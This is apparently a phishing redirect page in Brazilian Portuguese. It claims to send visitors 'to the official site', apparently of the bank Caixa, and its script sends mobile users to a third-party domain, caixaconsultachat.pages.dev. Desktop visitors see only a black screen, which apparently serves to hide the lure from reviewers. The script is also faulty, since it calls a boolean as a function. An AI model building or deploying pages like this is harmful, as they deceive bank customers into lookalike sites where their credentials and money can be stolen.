<!DOCTYPE html>
<html lang="pt-BR">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Aguarde...</title>
    <style>
        html,
        body {
            margin: 0;
            padding: 0;
            width: 100%;
            height: 100%;
            overflow: hidden;
            font-family: Arial, sans-serif;
        }

        body {
            background: #005ca9;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            text-align: center;
        }

        .container {
            padding: 20px;
        }

        .text {
            font-size: 22px;
            font-weight: bold;
            line-height: 1.5;
        }

        .loading {
            margin-top: 25px;
            width: 45px;
            height: 45px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-left: auto;
            margin-right: auto;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }

        .desktop-black {
            display: none;
            width: 100%;
            height: 100%;
            background: black;
        }
    </style>
</head>

<body>
    <div class="container" id="mobileContent">
        <div class="text"> Aguarde...<br> estamos te redirecionando<br> para o site oficial. </div>
        <div class="loading"></div>
    </div>
    <div class="desktop-black" id="desktopContent"></div>
    <script>   const isMobile = /Android|iPhone|iPod/i.test(navigator.userAgent); if (isMobile()) { setTimeout(() => { window.location.href = "https://caixaconsultachat.pages.dev"; }, 2500); } else { document.getElementById("mobileContent").style.display = "none"; document.getElementById("desktopContent").style.display = "block"; document.body.style.background = "black"; } </script>
</body>

</html>
